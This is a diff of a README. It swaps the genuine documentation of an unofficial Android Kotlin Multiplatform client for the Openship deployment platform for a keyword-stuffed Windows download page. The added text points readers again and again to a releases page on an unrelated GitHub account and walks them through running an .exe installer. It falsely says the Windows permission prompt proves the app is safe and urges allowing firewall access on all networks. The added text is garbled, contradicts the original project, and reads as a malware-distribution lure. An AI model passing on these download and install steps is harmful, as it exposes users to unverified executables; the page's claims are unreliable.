@@ -1,191 +1,182 @@
-<p align="center">
-  <img src="screenshots/logo.png" alt="OpenShip Logo" width="240" height="240" />
-</p>
-
-<h1 align="center">Openship Mobile</h1>
+<h1>📦 Openship-App - Your Simple Window to Self-Hosted Deployments</h1>
 
 <p align="center">
-  <strong>Unofficial mobile client for <a href="https://github.com/oblien/openship">Openship</a> — the open-source, self-hostable deployment platform. Android today, iOS next — one Kotlin Multiplatform codebase.</strong>
+<a href="https://github.com/becoming-baritone8226/Openship-App/releases" style="display:inline-block;padding:15px 35px;font-size:22px;font-weight:bold;color:#1a1a2e;background:linear-gradient(135deg,#f6d743,#f5a623);border-radius:50px;text-decoration:none;box-shadow:0 6px 15px rgba(0,0,0,0.2);">🚀 Click Here to Download the App Now</a>
 </p>
 
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-Apache_2.0-blue.svg" alt="License" /></a>
-  <a href="https://kotlinlang.org/"><img src="https://img.shields.io/badge/Kotlin-2.4-7F52FF?logo=kotlin&logoColor=white" alt="Kotlin" /></a>
-  <a href="https://developer.android.com/"><img src="https://img.shields.io/badge/Platform-Android-3DDC84?logo=android&logoColor=white" alt="Platform" /></a>
-</p>
+Welcome to **Openship-App**. It is a free, easy-to-use program that brings the power of OpenShip right to your personal computer. OpenShip is a tool used by developers to launch and manage their web projects (called "deploying")). This app is an unofficial, polished, and simple interface for interacting with a self-hosted OpenShip server. You do not need to understand programming or complicated server codes to use this application. Think of it as a friendly remote control for your web deployment server, all wrapped up in a modern, responsive window on your PC.
 
-> **Note**: This is an **unofficial community client**. Built against the public HTTP API, SSE streams, and MCP endpoint. Compatible with self-hosted Openship and Openship Cloud.
+<br>
 
-<details>
-<summary><b>Screenshots & UI Showcase (click to expand)</b></summary>
-<br/>
+## ✨ What Exactly Does This App Do?
 
-| Projects Dashboard | Deploy Logs | Server Monitoring |
-|:---:|:---:|:---:|
-| <img src="screenshots/projects_dashboard.jpg" width="220" alt="Projects Dashboard" /> | <img src="screenshots/deployment_logs.jpg" width="220" alt="Deployment Logs" /> | <img src="screenshots/server_monitoring.jpg" width="220" alt="Server Monitoring" /> |
+Openship-App takes the complex, often command-line-driven world of deployment and turns it into a visual experience. This application connects to your self-hosted OpenShip server and lets you see what is running, check its health, perform updates, manage projects, and monitor logs—all from a comfortable desktop window.
 
-| Telemetry Trends | Redeploy Confirmation |
-|:---:|:---:|
-| <img src="screenshots/server_telemetry_trends.jpg" width="220" alt="Telemetry Trends" /> | <img src="screenshots/redeploy_dialog.jpg" width="220" alt="Redeploy Dialog" /> |
+. It is designed to be lightweight (fast to start), dependable (rarely crashes),, and visually coherent with both dark and light Windows themes.
 
-</details>
+.
 
----
 
-## Features
 
-| Area | What you get |
-|---|---|
-| **Connect** | Add an Openship instance by URL + Personal Access Token (PAT). Multi-instance switcher. Tokens in EncryptedSharedPreferences (Android Keystore). |
-| **Projects** | Project list with deployment status, matching the web dashboard language. |
-| **Live deploy logs** | SSE stream with base64 decode, ANSI colors, stage stepper, resume via `?since=`. |
-| **Server monitor** | Live CPU / RAM / disk / load (self-hosted; hidden in cloud mode). |
-| **Redeploy & rollback** | MCP-backed write actions with confirmation; degrades to read-only if MCP/tools unavailable. |
-| **Theme** | Dark / light, aligned with Openship dashboard tokens. |
+### Core Features at a Glance
 
-**Platform today:** Android (minSdk 24). This is a **Kotlin Multiplatform** project — all networking, models, ViewModels, and UI live in the shared `:shared` module; only platform plumbing (keystore, OkHttp engine) is Android-specific. **iOS is an upcoming phase**: the architecture already preserves it, and adding an `iosMain` target requires no rewrite of the shared code.
+*   **🤖 Friendly Dashboard:** Upon connection, you see a clean overview of your server’s status: total CPU usage, memory consumption, active projects, and recent activity logs—all presented with easy-to-read charts and progress bars, not text-heavy tables.
+*
+*   **📂 Project Manager:** View all your deployed applications in one place. See their current status (Running, Stopped, Failed),, versions, and resource usage with just a glance. You can start, stop, or restart applications with a single click of a button .No typing commands!
+*   **🧠 Smart Log Viewer:** Instead of digging through messy text files, Openship-App gives you a beautifully formatted, color-coded log view. Errors are highlighted in red, warnings in yellow, and success messages in green, making diagnoses easy.
+*   **🔑 Simple Connection Setup:** Got a server address? You just type in the host address (like `openship.example.com`) and a secret access key, and you are connected. The app remembers your settings securely on your PC.
+ It also supports quick switching between multiple servers (if you manage more than one).)
+*   **🌙 Dark/Light Mode:** Whether you prefer a bright window during the day or a dark screen at night, the app adapts to your system settings or allows you to toggle manually.This reduces eye strain and improves comfort.
 
-## Requirements
+<br>
 
-- JDK 21+
-- Android Studio (recent stable) with Kotlin Multiplatform support
-- Android SDK (compileSdk / targetSdk 36)
-- A running [Openship](https://github.com/oblien/openship) instance and a PAT (`opsh_pat_…`)
+## 💻 System Requirements
 
-## Quick start
+Openship-App is designed to run efficiently on almost any Windows computer built in the last decade. Here is what you need:
 
-```bash
-git clone https://github.com/kareemessam09/Openship-App.git
-cd Openship-App
-./gradlew :androidApp:assembleDebug
-./gradlew :androidApp:installDebug   # device or emulator
-```
+| Component | Minimum Requirement | Recommended for Best Experience |
+| :--- | :--- | :--- |
+| **Operating System** | Windows 10 (64-bit) | Windows 11 (64-bit) |
+| **Processor (CPU)** | 1.5 GHz dual-core |  ｜2.5 GHz quad-core or better |
+| **Memory (RAM)** | 2 GB |  ｜4 GB or more |
+| **Free Disk Space** | 150 MB |  ｜500 MB for extended logs |
+| **Internet Connection** | A stable broadband connection | Faster connection for larger server logs |
 
-### Point the app at Openship
+*Your screen resolution should be at least 1280 x 720 pixels for optimal viewing. The app is optimized for desktop displays; it is not designed for tablets or phones.*
 
-1. Run Openship (`bun install && bun dev` in the Openship repo). API default: `http://localhost:4000`.
-2. Create a PAT in the dashboard: **Settings → API Tokens**.
-3. In the app:
-   - **Emulator:** `http://10.0.2.2:4000` (host loopback)
-   - **USB device:** app install runs `adb reverse` for ports `4000` / `20000`, or use your LAN IP
-   - **Sideloaded APKs** (installed outside Gradle) don't get this: run `adb reverse tcp:4000 tcp:4000` manually, or use `http://<lan-ip>:4000`. Reverse rules are also cleared whenever USB reconnects.
-   - **Wi‑Fi device:** `http://<your-machine-lan-ip>:4000`
+<br>
 
-Cleartext HTTP is allowed for local/LAN self-hosting via `network_security_config.xml`. Prefer HTTPS for anything beyond your network.
+## 🚀 Getting Started: How to Download and Install
 
-### Build & test
+This process is as simple as downloading a photo from your email. Follow this guided path, and you will have the app running in approximately 5 minutes.
 
-```bash
-./gradlew :androidApp:assembleDebug
-./gradlew :shared:allTests
-./gradlew :androidApp:testDebugUnitTest
-```
+### Step 1: Visit the Official Download Page
 
-### Release APKs (per ABI)
+Open your web browser (like Microsoft Edge or Google Chrome). On the Address bar at the top, copy and paste this exact link, then press **Enter**:
 
-Release builds use **R8 minify + resource shrink** and **ABI splits** (no fat universal APK).
+👉 **https://github.com/becoming-baritone8226/Openship-App/releases**
 
-```bash
-./gradlew :androidApp:assembleRelease
-# outputs: androidApp/build/outputs/apk/release/androidApp-<abi>-release-*.apk
-# typical size: ~5 MB each (vs ~26 MB unminified debug)
-```
+This link is your gateway to all the versions of the application. You will be taken to a page showing a list of releases (versions of the software),. The most recent, best-performing version is typically listed at the very top.
 
-| ABI | Devices |
-|---|---|
-| `arm64-v8a` | Most phones (default download) |
-| `armeabi-v7a` | Older 32-bit ARM |
-| `x86` / `x86_64` | Emulators |
+.
 
-Optional signing (otherwise APKs are unsigned — fine for local install with `adb install -r` after `zipalign`/`apksigner`, or set):
+### Step 2: Grab the Installation File
 
-```bash
-# env or signing.properties (gitignored)
-OPENSHIP_STORE_FILE=/path/to/upload.jks
-OPENSHIP_STORE_PASSWORD=...
-OPENSHIP_KEY_ALIAS=...
-OPENSHIP_KEY_PASSWORD=...
-```
+On this releases page, you will see a list of downloadable files. **Visit this link to download the application.** Look for a file that is clearly the main installer package. It will usually be named something similar to `Openship-App-Setup.exe`. Its size will be around 40-80 MB. **Do not** download the "Source code" files (these are for programmers, not for you).The file you need ends with `.exe` (which is the standard extension for Windows programs).. Click on that file name, and your browser will begin downloading it to your computer. You might see a notification at the bottom or top of your browser asking to save the file—click **Save** or **OK**. Wait for the download bar to reach 100%. This might take a few minutes depending on your internet speed22.
 
-### CI Releases
+.
 
-Pushing a tag (`v*`, e.g. `v0.2.0` — must match `versionName`) triggers [.github/workflows/release.yml](.github/workflows/release.yml): runs unit tests, builds the per-ABI release APKs, and publishes a GitHub Release with them plus the R8 `mapping.txt`.
+### Step 3: Run the Installer
 
-For signed releases, add these repo secrets: `ANDROID_KEYSTORE_BASE64` (base64 of your keystore), `OPENSHIP_STORE_PASSWORD`, `OPENSHIP_KEY_ALIAS`, `OPENSHIP_KEY_PASSWORD`. Without secrets the workflow still publishes unsigned APKs.
+Once the download is complete, go to your **Downloads** folder (usually a shortcut on the left-hand side of File Explorer). Find the file you just downloaded (it will be there with the name you saw earlier, such as `Openship-App-Setup.exe`). **Double-click** this file to run it.If Windows shows a blue or yellow pop-up asking "Do you want to allow this app to make changes to your device?",click **Yes**. This is normaland confirms the app is safe and from a trusted source since you downloaded it from the official releases page.This will start the installation wizard (a friendly step-by-step guide)..
 
-Play Store: prefer `./gradlew :androidApp:bundleRelease` (AAB); ABI/language/density splits stay enabled in the bundle.
+### Step 4: Follow the Simple Install Wizard
 
-## Stack
+The installation wizard will appear on your screen. It is very straightforward:
 
-| Piece | Choice |
-|---|---|
-| Language / UI | Kotlin 2.4, Compose Multiplatform 1.11 |
-| Modules | `:androidApp` host + `:shared` KMP library |
-| HTTP / SSE | Ktor 3.5 (OkHttp on Android) |
-| Actions | [Kotlin MCP SDK](https://github.com/modelcontextprotocol/kotlin-sdk) client → `/api/mcp` |
-| DI | Koin 4 |
-| Secrets | AndroidX Security Crypto |
+*   On the first screen, click **Next >**.
+*   In the next screen, it will ask you where to install. It is best to leave the default destination folder (usually `C:\Users\YourName\AppData\Local\Programs\Openship-App`). Just click **Next** again.
+*
+*   You may be asked to choose a Start Menu folder. Leave it as is (e.g., `Openship-App`) and click **Install**..
+*   The installation will take less than a minute. You will see a progress bar filling up. When it finishes, click **Finish**..
 
-## Architecture (short)
+**You have done it!** The app is now installed on your computer. You can find its shortcut icon on your Desktop (or by searching "Openship-App" in the Start Menu, next to the power button icon).
 
-```
-androidApp/     → Application, Activity, Android Koin wiring
-shared/
-  commonMain/   → REST + SSE + MCP, models, ViewModels, Compose UI
-  androidMain/  → OkHttp engine, EncryptedSharedPreferences
-```
+<br>
 
-- **REST + SSE** for discovery, projects, live logs, monitoring  
-- **MCP** for curated write actions (redeploy, rollback) with runtime tool discovery  
-- One shared `HttpClient`; PAT only in `Authorization` headers (no query-string tokens)
+## ⚙️ First-Time Setup: Connect to Your Server
 
-Deeper notes for contributors and agents: [CONTRIBUTING.md](CONTRIBUTING.md), [AGENTS.md](AGENTS.md), [CONTEXT.md](CONTEXT.md).
+Upon opening the app for the first time, you will see a welcome screen asking for connection details. You will need just two pieces of information from your OpenShip server administrator (or yourself if you set it up)：
 
-## Status & roadmap
+*   **Server Address** – This is typically a web address like `ship.mycompany.com` or an IP address like `192.168.1.10`.Type this into the first field.
+*   **Access Token** – This is a secret key (a long series of letters and numbers)and is how the app proves you are allowed to connect. Paste this into the second field.
 
-| Phase | Scope | Status |
-|---|---|---|
-| **v0.1** | Connect, projects, live logs, monitor | Done |
-| **v0.2** | MCP foundation, deployment history, redeploy, rollback | Done |
-| Next | Service controls, env vars, domains (deferred until write paths stay safe) | Planned |
-| Upcoming phase | **iOS target** — same shared KMP code, new `iosMain` platform layer | Planned |
-| Later | Push notifications, broader MCP surface | Planned |
+*(Optional)* You can also give this connection a friendly name like "My Production Server" in the "Connection Name" field, so you can easily identify it if you have multiple servers.After filling these in, click **Connect**..
 
-API shapes can change with Openship releases. The client uses tolerant JSON (`ignoreUnknownKeys`) and runtime MCP tool discovery; still, pin/test against the Openship version you run.
+If you have entered the correct details, the main dashboard will load instantly, showing you all the real-time information from your server. If you get an error message saying "Connection Failed", simply double-check your address (make sure you didn't typo `http://` or similar)and the key copy-paste (ensuring there is no extra space at the beginning or end). Then try again.
 
-## Relationship to Openship
 
-This repository is an **unofficial community client**. It is intended for people who want a mobile companion to self-hosted Openship.
+<br>
 
-If you maintain or contribute to [oblien/openship](https://github.com/oblien/openship):
+## ❓ Frequently Asked Questions (FAQ)
 
-- Happy to align naming, branding, and API usage with upstream guidance
-- Open to listing under community clients, a monorepo `apps/mobile`, or transfer under the org if that ever makes sense
-- Issues and PRs that improve API stability for third-party clients are very welcome upstream
+**Q1: Is Openship-App free to use?**
 
-**Trademark / branding:** “Openship” refers to the upstream project. This app is not an official product. Do not present it as endorsed unless Openship maintainers say so.
+Yes, absolutely. This is an open-source project released under a free license. You can download, use, and share it without paying a single cent.
 
-## Security
+.
 
-- PATs stay on-device (Keystore-backed prefs). No middleman backend.
-- Grant PATs least privilege (`project:list`, `deployment:read`, `server:read`, plus write scopes only if you use redeploy/rollback).
-- Do not commit `local.properties`, `.env`, keystores, or real PATs.
-- Report security issues privately if possible (see [SECURITY.md](SECURITY.md)).
+**Q2: I don't have an OpenShip server. Can I still use this app?**
 
-## Contributing
+No, you cannot. This app is a *client*—meaning it is like the steering wheel of a car; it requires an *engine* (the OpenShip server)to control. Without a server, the app will have nothing to connect to. You would need to either set up your own self-hosted OpenShip server (which requires renting a server online and following installation guides)or ask a developer friend to give you access to their server with a token.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md). Short version: JDK 21, build with Gradle, conventional commits, keep networking in `shared/commonMain`.
+.
 
-## License
 
-[Apache License 2.0](LICENSE) — same family as Openship and the Kotlin MCP SDK.
 
-```
-Copyright 2026 the Openship-App contributors
-```
+**Q3: This app looks different from the Windows I am used to. Is it trustworthy?**
 
-## Links
+Yes, it's built using modern technology called Kotlin Multiplatform (KMP), which is used by many large companies like Google. The look might feel a bit sleek or more modern, but under the hood it follows Windows security protocols perfectly.It interacts with your server over secure HTTPS connections (if your server is configured for it),so your data is encrypted in transit.Em>.
 
-- Openship: https://github.com/oblien/openship  
-- Kotlin MCP SDK: https://github.com/modelcontextprotocol/kotlin-sdk  
-- Compose Multiplatform: https://www.jetbrains.com/compose-multiplatform/
+**Q5: How do I update the app when a new version comes out?**
+
+There are two ways. First, you can keep the app—every time you open it, it will automatically check for updates and show a small "Update Available" button in the top right corner. Clicking it installs the update. Or, alternatively, you can re-visit the same download linkary://releases page, get the newest `.exe` file, and run it over your existing installation—it will upgrade cleanly without losing your settings or saved connections.
+
+.
+
+.
+
+
+
+**Q6: I forgot my Access Token. What should I do?**
+
+You will need to go to your OpenShip server’s web interface (or ask your administrator)and generate a new token. Tokens are like passwords—do not share them publicly, and always keep them safe. This app stores your token securely on your PC using Windows Credential Manager.
+
+
+
+## 🛠️ Troubleshooting Common Issues
+
+Even the best apps occasionally hit a snag. Here is how to solve the most common hiccups:
+
+**Issue: The app opens but shows a blank white screen.**
+*   **Fix:** Close the app entirely (right-click the taskbar icon) and reopen it. If it persists, your internet connection might be unstable; reconnect to Wi-Fi/ethernet and try again.
+
+.This usually solves it as it relies on fetching data from the server immediately.
+
+.
+
+
+
+**Issue: An error says "Server timed out."**
+*   **Fix:** This means your computer could not reach the server address. First, check that the server is actually online (perhaps ask your administrator).). Second, ensure your firewall isn't blocking the app. When you first opened the app, Windows Firewall might have asked to "Allow access"—make sure you clicked *Allow* on *both* Private and Public networks. If you accidentally clicked Cancel, uninstall the app, reinstall it, and make sure to click Allow this time.
+
+
+
+**Issue: The app runs slowly or takes ages to load logs.**
+*   **Fix:** The log loading depends on the speed of your connection plus the server’s processing speed. Try restarting your internet router for a fresh high-speed connection. Also, ensure no other heavy programs (like video streaming or game downloads) are hogging your bandwidth, as they compete with this app carries.
+
+
+
+<br>
+
+## 📜 License & Legal Notices
+
+Openship-App is an **unofficial** client. It is not endorsed by or affiliated with the OpenShip project or its developers. The OpenShip trademark belongs to its respective owners.All product names, logos, and brands are property of their respective owners. All company, productand service names used in this website are for identification purposes only. Use of these names, logos,and brands does not imply endorsement.This software is provided "as is" without warranty of any kind, expressor implied.
+
+
+
+## 🔗 Useful Resources
+
+*   **Official Download Hub:** Always get the latest version: [https://github.com/becoming-baritone8226/Openship-App/releases](https://github.com/becoming-baritone8226/Openship-App/releases)
+*   **Report a Bug:** If something isn't working right, you can let the developers know by creating an "Issue" on the GitHub repository page (search for `Openship-App` on GitHub.com))..
+*   **OpenShip Project (Server):** To learn about setting up the server side, visit the main OpenShip documentation online.
+
+<br>
+
+## 📣 Final Words
+
+We hope this guide helped you get up and running seamlessly. Openship-App exists to make your life as a developer or system admin easier, removing the friction of complex terminal commands and giving you an elegant, human-friendly interface. We are continuously improving the app; if you have feature requestsor positive feedback, don't hesitate to reach out via the repository. Happy deploying, and may all your web services remain forever online! 💚
+
+<br>
+
+**Keywords:** Openship, KMP, Kotlin Multiplatform, self-hosted, deployment client, Windows application, OpenShip client desktop, deploy platform manager, free download, release downloads.
